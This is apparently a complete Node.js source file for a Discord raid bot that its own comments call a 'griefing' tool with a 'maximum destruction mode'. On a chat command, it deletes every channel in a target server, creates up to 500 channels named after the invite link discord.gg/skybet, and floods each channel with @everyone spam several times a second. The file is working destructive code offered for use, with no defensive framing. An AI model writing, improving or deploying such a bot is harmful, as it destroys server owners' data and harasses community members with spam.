const { Client, GatewayIntentBits, PermissionFlagsBits } = require('discord.js');
require('dotenv').config();

// Fix for ReadableStream undefined error
if (typeof ReadableStream === 'undefined') {
  global.ReadableStream = require('stream/web').ReadableStream;
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Bot configuration from environment variables
const config = {
  token: process.env.DISCORD_TOKEN,
  targetServerId: process.env.TARGET_SERVER_ID,
  channelName: 'discord.gg/skybet',
  messageContent: '@everyone discord.gg/skybet',
  command: '.lolgg'
};

// Track if the griefing process is active
let isGriefing = false;
let spamIntervals = new Map(); // Store intervals for each channel

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
  console.log('Bot is ready to execute commands');
});

client.on('messageCreate', async message => {
  // Check if the message is the command to start griefing
  if (message.content === config.command && !isGriefing) {
    // Check if the user has admin permissions
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return message.reply('You need administrator permissions to use this command.');
    }
    
    isGriefing = true;
    message.channel.send('Starting maximum destruction mode...');
    
    // Get the target server
    const guild = client.guilds.cache.get(config.targetServerId) || message.guild;
    
    if (!guild) {
      message.channel.send('Could not find the target server.');
      isGriefing = false;
      return;
    }
    
    // Start the continuous griefing process
    startMaximumDestruction(guild);
  }
  
  // Command to stop griefing
  if (message.content === '.stop' && isGriefing) {
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return message.reply('You need administrator permissions to use this command.');
    }
    
    isGriefing = false;
    stopAllSpam();
    message.channel.send('Destruction process stopped.');
  }
});

async function startMaximumDestruction(guild) {
  try {
    // Delete all existing channels super fast
    await deleteAllChannelsFast(guild);
    
    // Create maximum number of channels (500 is Discord's limit)
    const channels = await createMaxChannels(guild, 500);
    
    // Start spamming in each channel at maximum speed
    for (const channel of channels) {
      startAggressiveSpam(channel);
    }
    
    console.log(`Started aggressive spamming in ${channels.length} channels`);
  } catch (error) {
    console.error('Error during destruction:', error);
  }
}

async function deleteAllChannelsFast(guild) {
  console.log('Deleting all existing channels at maximum speed...');
  
  // Get all channels in the guild
  const channels = guild.channels.cache;
  
  // Create deletion promises for all channels
  const deletionPromises = [];
  
  for (const [id, channel] of channels) {
    deletionPromises.push(
      channel.delete().catch(error => {
        console.error(`Failed to delete channel ${channel.name}:`, error);
      })
    );
  }
  
  // Wait for all deletions to complete
  await Promise.all(deletionPromises);
  console.log('All channels deleted');
}

async function createMaxChannels(guild, maxChannels) {
  console.log(`Creating maximum ${maxChannels} channels...`);
  const channels = [];
  
  // Create channels in batches to optimize speed
  const batchSize = 10;
  let created = 0;
  
  while (created < maxChannels) {
    const batch = [];
    const currentBatchSize = Math.min(batchSize, maxChannels - created);
    
    for (let i = 0; i < currentBatchSize; i++) {
      batch.push(
        guild.channels.create({
          name: `${config.channelName}-${created + i + 1}`,
          type: 0, // Text channel
          permissionOverwrites: [
            {
              id: guild.id,
              allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages]
            }
          ]
        }).then(channel => {
          channels.push(channel);
          console.log(`Created channel: ${channel.name}`);
          return channel;
        }).catch(error => {
          console.error(`Failed to create channel:`, error);
        })
      );
    }
    
    // Wait for the current batch to complete
    await Promise.all(batch);
    created += currentBatchSize;
    
    // Small delay between batches to avoid rate limiting
    await new Promise(resolve => setTimeout(resolve, 500));
  }
  
  return channels;
}

function startAggressiveSpam(channel) {
  // Create an interval for this specific channel
  const interval = setInterval(async () => {
    if (!isGriefing) return;
    
    try {
      // Send 10 messages rapidly
      for (let i = 0; i < 10; i++) {
        await channel.send(config.messageContent);
      }
      console.log(`Sent 10 messages in channel: ${channel.name}`);
    } catch (error) {
      console.error(`Failed to spam in channel ${channel.name}:`, error);
    }
  }, 100); // Send 10 messages every 100ms (10 per second)
  
  // Store the interval so we can clear it later
  spamIntervals.set(channel.id, interval);
}

function stopAllSpam() {
  // Clear all spam intervals
  for (const [channelId, interval] of spamIntervals) {
    clearInterval(interval);
  }
  spamIntervals.clear();
}

// Login to Discord with your bot token
client.login(config.token);
